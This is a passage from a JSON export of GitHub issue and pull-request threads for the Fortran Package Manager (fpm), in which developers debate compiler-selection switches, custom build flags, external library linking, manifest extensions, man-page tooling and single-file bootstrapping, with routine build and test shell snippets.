                    "text": "For whatever reason the browser is not letting me edit the post. I wanted to update it with some of the changes as a working document.  Using FC instead of making up a \"new\" name seems like a particularly good one.  Since hyphens are part of the  \"space-hyphen value\" of POSIX commands  I find the underscore useful for names, and then the names can be used directly in the code as well as hyphen is allowed in Fortran variable names; but that is probably as much personal taste as anything else as that argument has been going on at least as long as which text editor is \"best\" and which programming language is \"best\".   When I get to a machine that works I will try to capture this all into a second take. Thanks for the quick response.  I strongly want some of this to go into the TOML/configuration files so packages can be shared more readily but there will always be some need for directly specifying the switches and it lets us more experience with the issues of multiple compiler support On that note, I THINK your input on M_CLI2 plus working through several compiler bugs has the latest version of M_CLI2 passing its tests with nvfortran, ifort, and gfortran8.3+.  Each compiler has it's pros and cons and bugs/features; but considering all that I think it is quite portable to modern Fortran compilers. It's predecessor was F77 and can on everything from SCOPE 2/UNICOS/SunOS/Solaris/HP-UX/AIX/NetBSD/Linux/Tru64/... so it was interesting that some of the modernizing made that a bit harder than I expected. It got cluttered by making a stand-alone version of; I hope to streamline it and add a bit of OOP to it in the future, but not in a hurry as long as it functions as intended."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-24 15:50:26+00:00",
                    "text": "Anyone have any favorite compiler options for compilers other than gfortran  that would be used as a seed for the default and --release compiler switches?\nAny suggestions for the --build_name key name that seem better or shorter?  --tag or --ID perhaps?\nI added a number of other compiler names for testing  based on the list in  #223 but have no great way of testing the majority of them.\nA lot of the vendors used to support on-line access to test machines  (manufactures and compiler vendors) but I do not see any remaining ones. Something for the wish list would be web interfaces for various compilers where you could give the URL of an fpm package and it would do a build of it and show the resulting output.  Probably asking to much for more than a build,  but just the build would be nice. After all, legend says some unnamed companies have the policy \"It compiled, ship it!\"."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-24 16:38:03+00:00",
                    "text": "still oscillating on a separate subcommand like compile or custom  versus build, test, run allowing customization if a custom build name is provided.  A actually like the switches better but the interface is cleaner (as is documentation) if it a separate command.  Something in-between where the custom/compile command just does a custom build and the test and run subcommands remain the same except they have a -ID switch added?  If the -ID switch is present run and test would not do an automatic build even if the executables are not built.   Everyone would have the --compiler switch.\nfpm compile --ID xxxxx  --compiler xxxx -flag xxx  .[regular_build_options] -- LOADER_OPTIONS\nmaybe no --flag option   but options allowed after the compiler name, eg. \"--compiler 'myf90 -traceback -pg' \"\nwhich might be easier for a user to use using environment variables , or  if the build,run,test commands could have a tag added to the name which would act like the --ID switch?\nfpm build,mytest=' -pg -O3' ...\nfpm run,mytest ...\nfpm test,mytest ...\nIf ID is not provided"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 03:55:56+00:00",
                    "text": "Provisional Custom Compiles\nSo, after going through the suggestions and some testing with similar h-fpm features this is\nwhat I am proposing. Looking for feedback and whether this is ready to\npropose as a PR (Pull Request).\nAdd compiler switch --fc\nrun, test,build, and a new command called compile have a switch called\n--fc that sets the Fortran compiler name. The default is to use the\nvalue of the environment variable FC. If it is not set the name gfortran\nis used.\nFC is apparently a commonly used environment variable for the compiler, is\nshort, and allows for specifying compilers for other languages like C (ie. -cc gcc)\nThat is part of the reasons to use --fc instead of --compiler.\nnew command \"compile\"\nThe compile command is like the build command except it does not have\nthe --release parameter. In addition it has the new options\n--ID NAME               user-supplied name for the custom build. Required\n--flags ARGUMENTS, -F   custom compiler flags\n\n-ID switch added to test and run to match name on compile command\nThe ID names release and debug are reserved and cannot be used.\n--ID is also added to run and test. If present on those commands no\nautomatic builds occur and the matching build created with compile is used.\nThe name custom is currently an alias for compile. I prefer custom and\nam looking for feedback on it.\npreliminary support for alternate compilers for testing\nA skeleton was started for standard debug and release builds that allows\nfor compilers other than gfortran. I now have access to ifort\nand nvfortran and it works with at least simple cases for those\ncompilers. Looking for someone with access to other compilers to help\nflesh that out.\nSUMMARY\nSo default usage is unchanged from the previous version. By simply setting FC you can use it like the\nprevious version with other compilers for default builds. Other than the compiler\nswitch which I suspect would be used infrequently versus the FC compiler the\nonly change to test and run is the --ID switch. The ID must be a name\nsuitable as a Fortran variable. It allows for simple custom builds and loads.\nHow does that sound?\nInstructions for testing before PR is submitted\n# single-file program for testing\nwget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n# or pull from webpage of same name\n\n# build and call ffpm. Example. Change output name as appropriate to put\n# into your search path\ngfortran ffpm.f90 -o $HOME/.local/bin/ffpm\nsample testing\n# get a test package or use your own\nif [ ! -d M_CLI2 ]\nthen\n   git clone https://github.com/urbanjost/M_CLI2\nfi\ncd M_CLI2\n\nset -x\n\n# simple custom build\nffpm compile --fc nvfortran --flags '-Mbackslash' --ID ONE\nffpm run -ID ONE\n\n# default build using ifort\nffpm build --fc ifort\n\n# default build\nffpm build\n# default release build\nffpm build --release\n\n# not sure if this should do a default build or build with gfortran with\n# no other switches\nffpm build --fc gfortran\n# will not allow reserved names debug and reserve even for this case\nffpm compile --fc gfortran --ID debug\n\n# profile with gfortran\nunset FC\nffpm compile --ID PROFILE  --flags '-pg'\nffpm run     --ID PROFILE\nffpm run     --ID PROFILE  --runner gprof\n\n# profile with --fc switch and ifort\nffpm compile --fc ifort --ID PROFILE --flags '-p'   # build\nffpm run     --fc ifort --ID PROFILE                  # run\nffpm run     --fc ifort --ID PROFILE  --runner gprof  # profile\n\n# profile using FC variable and appropriate flags for that compiler\nexport FC=ifort\nffpm compile --ID PROFILE --flags '-p'   # build\nffpm run     --ID PROFILE                  # run\nffpm run     --ID PROFILE  --runner gprof  # profile"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 11:20:32+00:00",
                    "text": "Thanks @urbanjost; I've had a quick play around with your proposal demo \u2014 it's exciting to be able to use other compilers with fpm!\nI've been using the --flag feature since it was introduced in bootstrap version and unfortunately I find it very clunky for a number of reasons. Your addition of compile/custom and ID is certainly an improvement on the compile+run workflow, but I still have to specify the flags correctly at the command line every time I run compile (which is often).\nIt's also worth noting that unlike the bootstrap method of hashing compiler flags for the output directory, this approach may end up with unintended effects if the compiler flags change but the ID does not during a partial rebuild (coming in #248).\nOnce flags can be specified in the manifest as different configs, I would be unlikely to use the compile/custom command or --flags flag ever again.\nIn essence, I don't think the command line is the right place for specifying compiler flags because it inevitably puts the burden on the user to manually 'load' and 'store' flags correctly at each invocation \u2014 I'd much rather store various flag combinations digitally in a toml file than in my brain.\n@urbanjost, would you be happy opening separate PRs for the specification of compilers and specification of flags? The former seems ready to go from a specification standpoint, whereas the latter may need more discussion in it's own PR."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 14:19:31+00:00",
                    "text": "I will split them.  My own comments in several other discussions is of the same sentiment. The prototype is just to aid the discussion. Everyone is different but I find it useful to actually try something if the discussion is stalled or has hit a roadblock.\nI separated this out as a way  to actually test using other compilers and a --flags switch like h-fpm because of some of those reasons. Since a TOML file is not the most intuitive feature I  found a prototype useful for exploring other alternatives like a command similiar to \"custom\" that would write a TOML entry;  using aliases and environment variables from the shell to create alternatives; whether a single name or ID should imply a compiler ...   If the configuration parameters are in a file they tend to be so specific to a compiler that I want something like  \"fpm custom profile\" and the name \"profile\" can be used with various compilers.\nAs-is I found\nI was not using the --flags directly but was buiding up a list of aliases such as \"fpm-profile\" that had the flags set for the build; but once you combine that with multiple compilers then it needs to be a script instead of an alias, and so on.\nSo this let me actually test some of those combinations. It also matches the flag of the same name in h-fpm, and so on; but a lack of compiler and load options seemed to be the most commonly mentioned reason people could not use the earlier fpm versions. Thanks for actually trying it. There are  pros and cons to any approach that involves supporting multiple compilers.\nSo my sentiment is similar but there is nothing like trying it.  I have been finding that with three compilers now available on my machine that I usually use the environment variable FC and start three terminal sessions in screen(1) or tmux(1) with one set up for each compiler and toggle between them. That has made me wonder if the compiler switch should allow multiple names like\n`fpm build -fc \"nvfortran gfortran intel\" .  That might seem useful to me because I am testing. In normal use I would guess most people have a specific compiler they primarily work in and they would just set \"FC\".  Since other products apparently use FC if that was implemented with a variable I think it would have to be one with a unique name like FPM_FC that would be looked for.\nStill looking for other feedback on --flags including experiences with h-fpm or other source package managers."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 17:47:52+00:00",
                    "text": "On the contrarian side of this; because of the problems with remembering the compiler switches I was considering that the first build of a directory cache some data. A TOML file would see appropriate but at least for the first cut I was just going to use NAMELIST. The first time you built a (compiler-specific) directory it would create a file with the compiler and load flags from the custom command, so that it would actually be more like new in that it would initialize a directory $FC/ID.\nThen build as well as run and test would have the ID switch; and build would not build unless the directory already existed and custom would always do a full build.   That way the switches are remembered and are consistent and the previous versions of build, run, and test have nothing added by one switch something like release.  Maybe even change the name from --ID to --custom, and the custom commands' first parameter would be the ID name.  That would be\nthe next prototype if everyone agrees this one does not cut it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 17:55:11+00:00",
                    "text": "fpm custom -fc ifort -fflags '-g -C -CB -CU -fpe8 -ftrapuv -fp-model=precise'  -ID my_debug\nfpm run -ID my_debug\nfpm build -ID mydebug\nfpm test -ID mydebug\nor fpm build --custom mydebug ...\nAssuming we allow a short name for --ID/--custom and you name with short names this could be\nfpm build -i d"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:01:32+00:00",
                    "text": "Currently build and custom do not use the \"unnamed\" fields so The --ID switch would not be required. TO allow the same for f-fpm there would have to be a change to do the same. Currently names following the subcommand are assumed to be targets (the name of the executables. To remove the --ID switch from all commands that would have to be changed so the same as h-fpm where you specify that with --target NAME. It depends on which would be used more commonly. Alternatively there could be runc and testc which would assume the first parameter is the custom build name instead of a target and test and run would be left as-is. With no pre-view or revision of these messages with an old version of firefox these are getting hard to compose. I will clean up the typos when I can access a more up-to-date machine.\nIt would be a non-compatible change to f-fpm to change to --target but would keep f-fpm and h-fpm more aligned; but this is still alpha.  I think with these changes the changes would be useful even with the TOML interface for development.  For producing a real package I think having the configuration in a shippable format in the TOML file will be the dominant format for build options that are required for a package to be functional (ie. coarray, openMP, external packages like -X11 and netCFD, .ncurses, MPI, ...)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:06:15+00:00",
                    "text": "So then the format could be\nfpm custom myopts --fflags 'compiler args' -- load_args\nfpm run myopts\nfpm run myopts -target demo1 -- options_for_demo1\nBut then to run multiple programs instead of\nfpm test test1 test2 test3\nit would have to be\nfpm run --target 'test1 test2 test3'"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-26 17:14:09+00:00",
                    "text": "If anyone is interested I renamed the ffpm.f90 file to ffpm-custom.f90 and put ffpm.f90 there, which is a preliminary version that just specifies a compiler.  So new, test, build have a --fc COMPILER_NAME switch. If not specified it looks for names specified with environment variable name FPM_FC, then FC.\n\nshould --compiler be an alias for --fc?\nany suggestions for  options for particular compilers for a default and release build?\nshould an unknown compiler name be an error or should fpm(1) warn and try with no compiler options?\nallowing more than one compiler name on a single build would require some refactoring. Is that desirable?\nshould the --fc switch name be optional on build?   build ifort |build -fc ifort? If so should new and test do the same and have to have application names specified via --target NAME(s) instead of being able to be names specified after the run subcommand?\nother?\n\nAfter some further testing I will start a new issue for just the compiler switch and probably close the one for the custom command unlesss there is interest.  If there is interest I will start a new discussion for that. In either case I plan on closing this one. Thoughts and comments welcome.  It will probably be a few days so in the meantime if anyone is interested in trying the single-file prototype please do."
                }
            ]
        },
        {
            "number": 234,
            "user": "urbanjost",
            "date": "2020-11-09 20:37:25+00:00",
            "title": "Allow compiler options on Fortran \"fpm build -- ARGS\"  [Fortran fpm]",
            "text": "The h-fpm version allows compiler options on the command line. I would propose allowing the same capability but using the\nsyntax\nfpm build [NAME(S)] [-release] -- ARGS\nwhere ARGS could be multiple compiler options.\n\nAny feedback on use cases for the feature, and comments on the h-fpm option would be informative as to whether this option should be added or not.\nshould the options replace all the options sans the ones required for the build (ie. -J, -I, ...) or be in addition to the default options?\nI think the documentation should indicate that this potentially breaks a package being self-describing, as it would be problematic to have required options on external dependencies. It  would be useful for building a top-level package with different options.  Options for profiling come to mind, as well as external system libraries. Other options are being discussed to handle the compile and load options as something provided in the manifest file but there will probably always be a case for supplying various options while developing a package.\nThe h-fpm version hashes the options to create a unique pathname for each combination of switches. That is an option as well as requiring a user-supplied name or still being in the standard location. Not sure what the general sentiment is about that.  Using the hash resolves all kinds of collision problems but could be hard to remember and duplicate unless the hash is reversable and tagged with a name for reuse.\nshould the options only apply to an application and not external dependencies and files in src/? Should there be an option to control what it applies to?  Would a rebuild of all package components be required?\nshould the syntax be the same in both the f-fpm and h-fpm packages or is it an advantage to allow for two syntaxes (and underlying implementation differences) for exploring more possibilities?",
            "comments": []
        },
        {
            "number": 233,
            "user": "awvwgk",
            "date": "2020-11-08 12:08:07+00:00",
            "title": "Allow linking against external libraries",
            "text": "Specification changes\n\nadd specification for build.link entry in manifest reference\nallow both a single string and an array of strings\nencourage use of single external dependency for package\ndon't forbid multiple external dependencies like cargo does\nallow link entry in executable or test scope\n\nFortran fpm changes\n\nimplement manifest type to store link entries\nallow both a single string and an array of strings for link entry (might be a useful feature in toml-f as well)\nrecursively collect libraries from dependencies\nappend link libraries to model%link_flags\nadd an example package using build.link (using BLAS, which is installed on the OSX and Ubuntu image)\nadd an example package using link in executable scope (using gomp)\nuse TOML-Fortran v0.2.1\n\nTODO\n\nimplement feature in Bootstrap fpm (different PR)\n\nExamples\nbuild.link = \"z\"  # -lz\nbuild.link = [\"blas\", \"lapack\"]  # -lblas -llapack\n[[executable]]\nlink = [\"fftw\"]\nCloses #119\nRelevant for #168",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 15:36:59+00:00",
                    "text": "I believe Cargo/Rust want to encourage (force?) small single purpose packages to allow a modular setup. While this is in general a good idea also for fpm, this scheme will not work well for some existing library dependencies. One example would be LAPACK, which also requires linking BLAS, or Intel's MKL which requires at least three external libraries to be linked.\nWorking around an artificial constraint of only one external library per project is possible (several dummy projects with just build.link entries), but in my opinion it is unnecessary to impose such a constraint on the user in the first place."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-10 14:21:13+00:00",
                    "text": "A possible cross-platform library for the test case could perhaps be the gcc openmp runtime api, libgomp.\nFor a simple API call without pragmas, linking directly with -lgomp should be okay on all platforms I think:\nprogram test\n  implicit none\n\n  interface\n    integer function omp_get_num_procs()\n    end function\n  end interface\n\n  print *, omp_get_num_procs()\n\nend program test"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-10 18:08:36+00:00",
                    "text": "I think this is a great idea. But I just want to make sure I understand the idea/implementation. As I understand it, you declare that the library needs to be linked to some external library(s), and then this information makes its way through the build process to packages that depend on it, and eventually to building and linking an executable, such that, if you depend on a package that needs linked with some external library, if you have that library installed (and in your LD_LIBRARY_PATH), then things just work. Does that explanation make sense?\nQuestion, do we want to allow specifying the same thing for specific executables and/or tests? That way packages that need an external library for an executable but not for the library can still be used as dependencies without needing the external library installed? Similar to how fpm dependencies can be specified that way?\nThis is obviously a necessity, but it does mean that some point a user may transitively end up depending on a package with one of these dependencies unknowingly and then be surprised and confused when their package won't compile. You end up with more of an implicit dependency on something that fpm can't help you with. Should we provide warnings or notices to users about these dependencies and suggestions to ensure they have them installed? Or should we require or suggest that these dependencies be repeated/explicitly declared if a package needs them, even if only because of some package they depend on?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 18:55:22+00:00",
                    "text": "A possible cross-platform library for the test case could perhaps be the gcc openmp runtime api, libgomp.\n\n@LKedward I was thinking about using OpenMP, but than again this is a very compiler specific can of worms, I don't want to open yet.\n\nDoes that explanation make sense?\n\n@everythingfunctional You got the right idea. This way the order of the link line is also generated correctly.\n\nQuestion, do we want to allow specifying the same thing for specific executables and/or tests? That way packages that need an external library for an executable but not for the library can still be used as dependencies without needing the external library installed? Similar to how fpm dependencies can be specified that way?\n\nAlso, this is an interesting suggestion, I have to think about this.\nIn case one wants to have link against a library only for a single executable, a workaround using the implemented syntax would be:\n[[executable]]\nname = \"extra-linking\"\ndependencies.link-zlib.path = \"link-zlib\"\nwith link-zlib/fpm.toml as\nname = \"link-zlib\"\nbuild.link = \"z\"\nI'm very much in favour to cut the chase here and allow to directly specify the external library dependency:\n[[executable]]\nname = \"extra-linking\"\nlink = \"z\"\n\nShould we provide warnings or notices to users about these dependencies and suggestions to ensure they have them installed? Or should we require or suggest that these dependencies be repeated/explicitly declared if a package needs them, even if only because of some package they depend on?\n\nI think we should make a difference between external library and external dependencies.\nA build.link = \"blas\" would try to link against whatever provides the libblas.*, providing this package is the users responsibility, fpm should do exactly as asked and try to link against libblas.*, we can't help here, except for reporting a useful error message when we cannot find a libblas.*.\nThe situation is different for dependencies.blas = \"*\". In this case fpm might search for a BLAS provider, like netlib-BLAS, openBLAS, BLIS or MKL. In case of MKL different libraries might have to be linked depending on the threading model.\nI would consider the build.link option as low-level access compared to actually depending on a blas package might be a smart high-level solution provided by fpm.\nThis is certainly not my own idea to separate it like this, meson has a low-level find_library compiler method, which is similar to build.link and a dependency function, which tries to use internal finders, pkg-config or cmake to get the correct libraries and flags.\nThis is an overall difficult scenario for fpm, because it can't control the environment it is running in. In case it fails to build the package, all it can do is provide the best summary of what possibly went wrong and hope the user can take it from there."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 20:27:47+00:00",
                    "text": "Rebased against d569a89 e034ad4."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-13 08:48:05+00:00",
                    "text": "With three approvals I will merge later today."
                }
            ]
        },
        {
            "number": 232,
            "user": "awvwgk",
            "date": "2020-11-08 10:38:18+00:00",
            "title": "Allow extra section in manifest",
            "text": "This PR adds an extra section to the package manifest. It is excluded from checks in Fortran fpm.\nThe general idea behind this section is:\n\nallow third party tools to store information in the package manifest\nstage new entries for the fpm registry without requiring a change in the manifest reference",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-09 22:20:28+00:00",
                    "text": "allow third party tools to store information in the package manifest\n\nI don't understand this. Can you give a concrete example? Why would other tools want to store info in the manifest? Would these be fpm plugins or something else?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 22:33:23+00:00",
                    "text": "I have nothing particular in mind yet, but one idea would be to allow tools like FORD/fprettify/... to read from fpm.toml instead of their own input file:\n[extra.ford]\noutput_dir = \"./docs\"\ndocmark = \"<\"\npredocmark = \">\"\n[extra.fprettify]\nindent = 4\nManaging those entries would be the responsibility of the respective tools and fpm just allows for a free space to do so.\nThe advantage of using fpm.toml is that the meta data has to specified only once, it reduces the repetition of project name, layout, descriptions, ... in case it is adapted by a commonly used tool."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-09 22:43:14+00:00",
                    "text": "Got it. I'm not opposed to it, but also don't see the need until users ask for it.\nIf others like it, I don't mind it going forward. @everythingfunctional @LKedward @urbanjost @certik what do you think?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 22:49:21+00:00",
                    "text": "Once you put it in, you have to support it. Without a specific use case or request for it, I'd be hesitant to put it in. It's an interesting idea, and would encourage tools and users to converge around supporting and using fpm, so I'm not opposed to it. I just don't think it should be done yet. We've got plenty of other things to get done first."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-11 09:13:22+00:00",
                    "text": "I am not opposed to this, I can see it's uses, particularly this:\n\nThe advantage of using fpm.toml is that the meta data has to specified only once, it reduces the repetition of project name, layout, descriptions, ... in case it is adapted by a commonly used tool.\n\nwhich opens the way for others to develop more tooling for the Fortran ecosystem.\n\nOnce you put it in, you have to support it.\n\nRegarding support, I think the point here is that the section is explicitly ignored by fpm, so there is no burden of maintenance for us."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-11 15:30:34+00:00",
                    "text": "Regarding support, I think the point here is that the section is explicitly ignored by fpm, so there is no burden of maintenance for us.\n\nTrue, there is essentially no maintenance cost for us, other than explicitly ignoring it and not being able to use that table for anything in the future. So it could be worth it, but as I said, I think we've got other things to worry about first."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 13:52:37+00:00",
                    "text": "This has been stale for while, therefore closing it now, we can revisit this feature later in case there is need."
                }
            ]
        },
        {
            "number": 231,
            "user": "scivision",
            "date": "2020-11-07 23:36:15+00:00",
            "title": "DOC: pure Fortran fpm build method?",
            "text": "Is there / will there be a way to build the pure Fortran + curl fpm itself without needing to install Haskell first? Would this be doable at least via a Makefile or is there generated source for fpm itself?\n(I would like to start using fpm across my Fortran projects as it seems Fortran submodules are/will be soon supported. I couldn't use fpm until Fortran submodules are supported.)",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-11-08 02:53:45+00:00",
                    "text": "Yes, that is planned:\n\n#123\n\n\u2026\nOn Sat, Nov 7, 2020, at 4:36 PM, Michael Hirsch wrote:\n\n\n Is there / will there be a way to build the pure Fortran + curl fpm\n itself without needing to install Haskell first? Would this be doable\n at least via a Makefile or is there generated source for fpm itself?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#231>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBJTPDSMRWAPKVGJNTSOXKXTANCNFSM4TN6GDMA>."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 10:13:47+00:00",
                    "text": "Bootstrapping fpm once with the Haskell version is currently required, but the Fortran fpm implementation should be able to bootstrap itself afterwards. We are working towards a first release and a way to provide binaries as a rolling release (#218)."
                },
                {
                    "user": "certik",
                    "date": "2020-11-08 17:16:07+00:00",
                    "text": "Yes, if you are ok with using an fpm binary as a starting point, then fpm will be able built itself eventually. The issue #123 is for bootstrapping from source from scratch."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-08 19:12:50+00:00",
                    "text": "If I understand correctly the end goal is to have the capability to build fpm from scratch with a Fortran compiler + CMake (among other methods). This would be great."
                },
                {
                    "user": "certik",
                    "date": "2020-11-08 19:38:31+00:00",
                    "text": "Yes, correct.\n\u2026\nOn Sun, Nov 8, 2020, at 12:13 PM, Michael Hirsch wrote:\n\n\n If I understand correctly the end goal is to have the capability to\n build fpm from scratch with a Fortran compiler + CMake (among other\n methods). This would be great.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#231 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWB7CE2L4HKKTPR3OP3SO3UT3ANCNFSM4TN6GDMA>."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 04:25:23+00:00",
                    "text": "Well, since the Fortran version does not have any C dependencies at this point it will actually build as a single Fortran file.\nLong story short I wanted a version of #229 on a machine that just had a Fortran compiler and that I could build with the\ndebugger so I used an old \"make\" trick:\ncd $(basename $0)\ncat >gfortran <<\\EOF\n#!/bin/bash\n(\nexec 2>&1\n/usr/bin/gfortran \"$@\" 2>&1\n) >/dev/null\nNAME=$(echo $*|xargs -n 1|grep '\\.f90$')\necho ============================================================\necho COMMAND \"$@\"\necho NAME $NAME\ncase \"$NAME\" in\n'');;\ntest/*);;\n*)\necho cat $NAME >> catthem\n;;\nesac\nEOF\n\necho '#!/bin/bash' >catthem\nexport PATH=`pwd`:$PATH\nchmod u+xr gfortran\nrm -rfv build\nfpm build\nmkdir -p _scratch\nbash catthem >_scratch/ffpm.f90\n(\ncd _scratch\ngfortran ffpm.f90 -o ../ffpm\n)\nrm gfortran\nrm catthem\nmv _scratch/ffpm.f90 .\nrm -rf _scratch\nexit\n\nIf you run that with the bootstrap fpm it makes a file called ffpm.f90 that compiles just fine with a simple gfortran compile.'.\nIt lets you try other compilers anduse a debugger on the code and other nice things for now. Would not commit to that being a long-term solution but it has been pretty handy lately.  Maybe we could place the file out there as a simple way for some people to test  the Alpha version without having to commit to much effort. Compile one file. Try it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-21 04:24:40+00:00",
                    "text": "i changed the use statements to all use the module that defines toml_table as the quickest way to get rid of that Intel compiler message and updated M_CLI2 to use standard-conforming use of : and * in that one line. Wondering if anyone can try the single-file bootstrap version with anything other than gfortran 8.3.1-5 on a Red Hat 8.2\nsystem. Particularly interested in gfortran 10 and non-gfortran compiles.\n wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90 \nand just compile the single file and if it builds the theory is it should be able to bootstrap a pull of the fpm/fpm Fortran directory without having to install anything on a machine except gfortran and git."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-21 08:23:38+00:00",
                    "text": "@urbanjost I did a bit of testing with all my available compiler toolchains on three different machines (Manjaro, RedHat, OpenSuse).\nGCC works nicely for me, tested 7.5, 8.4, 9.2, 10.1 and 10.2 so far. Intel is the same, compiles with 18.0, 19.0 and 19.1, but the resulting binary might be non-functional.\nPGI doesn't work since toml-f cannot be compiled due to a bug in 20.7 and 20.9 of the NVHPC compilers (see toml-f/toml-f#25). Also M_CLI2 triggers some PGI bugs, see urbanjost/M_CLI2#2.\nNAG fails on a logical formatter in M_CLI2 (see urbanjost/M_CLI2#1), but toml-f seems to be fine."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-22 02:23:11+00:00",
                    "text": "I took a try at this. To make fpm build purely from CMake, I would need to add FetchContent (CMake feature) to retrieve and build toml-f and M_CLI2. The goal of this is to partially address #123 by making fpm build from nothing more than CMake and Fortran compiler, without needing bootstrap fpm. Would this be useful?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-22 08:07:26+00:00",
                    "text": "@scivision I'm sometimes building fpm with meson myself. So I'm certainly not against adding another build system (cmake/meson/...) to this repository as it makes some tasks way easier.\nFrom #123 I suspect that a fpm dist --cmake command was intended for this purpose to generate a source distribution with additional CMake files. Until we are actually able to do this, another build system might be a suitable choice as well.\nFetchContent seems to be the easiest way to get the dependencies with CMake, I'm using something similar right now for toml-f."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-31 14:24:22+00:00",
                    "text": "Regarding the original query of building fpm without Haskell, this is now possible using a generated single-source for bootstrapping (see the bootstrapping instructions here) and so I will close this issue. For discussion of standalone tarballs etc. see #123."
                }
            ]
        },
        {
            "number": 230,
            "user": "awvwgk",
            "date": "2020-11-07 12:50:19+00:00",
            "title": "Create a specification of the fpm command line interface (asciidoctor)",
            "text": "Create fpm(1) and the currently available six subcommand manual pages.\nTo check the resulting manual pages on the command line translate them with asciidoctor:\nasciidoctor -b manpage fpm.adoc\nman -l fpm.1\n\n\nI guess asciidoc is not that well known by everybody, checkout its homepage and the asciidoctor project for a short overview. It is comparable to reStructuredText as an extendable and standardized markup language for technical writing. There are several large projects using it extensively but it is not as well known as Markdown.\n\nPlease review this PR while comparing to #261 and consider the following points\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nCloses #227\nCloses #261",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 18:01:31+00:00",
                    "text": "I have looked for alternatives to write man pages and CLI documentation, but asciidoc seems to be the best solution I could fine so far, therefore I will just open this PR for discussion."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-30 19:13:40+00:00",
                    "text": "Have you tried converting Markdown to man page format using Pandoc? There's an example here.\nI ask because 1) Markdown is simpler than Asciidoc and we're already writing Markdown for READMEs, and 2) pandoc is a more mature tool than asciidoctor (I think)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 19:19:06+00:00",
                    "text": "Thanks for the suggestion, I will give it a try and open another PR with markdown files if it works out nicely. Than we can compare and make a choice between the two."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 08:27:08+00:00",
                    "text": "Closing this for now. I might pickup the project again at some point. Feel free to use 2024a64 in case anyone wants to continue on this project."
                }
            ]
        },
        {
            "number": 229,
            "user": "LKedward",
            "date": "2020-11-06 11:37:32+00:00",
            "title": "Refactor run command",
            "text": "This PR simplifies the run command implementation to use information provided by the model%targets structure. This avoids the duplication of code which has caused the run command to construct executable paths differently to the build command; this PR fixes this problem.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 01:05:03+00:00",
                    "text": "So far the code looks good and is passing many tests but ran into\na few problems that might be on my side, and I have not gotten\nthrough some more complex builds with C code so I am still testing.\nI am excited on how well it it working on a machine with no bootstrap\nversion installed, just the Fortran version. Basic build, run, and\ntest are working with many fpm(1) packages I have with --release and\n--list.\nI like the change to just show the pathname with --list which I was\ngoing to put a little PR in for. It allows the names to be used with\nexternal filters easily. It works particularly well with the Unix\nxargs(1) command.\nOn a machine with just a single Fortran source built from #pr229\nmany fpm(1) packages are working. The ones that I do not think I\ncan build with this version are ones that require a \"fpm.mk\" or custom\nbuild script.\nSo this is the only issue I have to raise at this point ...\nWhen an executable does not exist there is no message.\n   ffpm new A --lib\n   cd A\n   ffpm run\n   ffpm test\nThis is different than the h-fpm version, which produces a warning\nmessage. It is arguable whether it should or should not produce a\nmessage for the case where there is no executable but even when the name\nis incorrect no error or warning is produced. eg:\n   ffpm run this_is_a_typo\ndoes not warn that there is no such executable. I think it should produce\na message and perhaps do the equivalent of the --list option to show the\navailable choices. Maybe just the basenames would be preferable in a\nlittle table.\n box_month       d2j              d2o              d2u            d2w\n date_to_julian  date_to_unix     days2sec         dow            easter\n fmtdate         fmtdate_usage    guessdate        j2d            julian_to_date\n mo2d            mo2v             moon_fullness    M_time_oop     now\n o2d             ordinal_seconds  ordinal_to_date  phase_of_moon  sec2days\n system_sleep    u2d              unix_to_date     v2mo           w2d\n runTests        \n\nmaybe just a message to say to use the --list option to see available choices when an unknown name is entered?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-07 17:23:46+00:00",
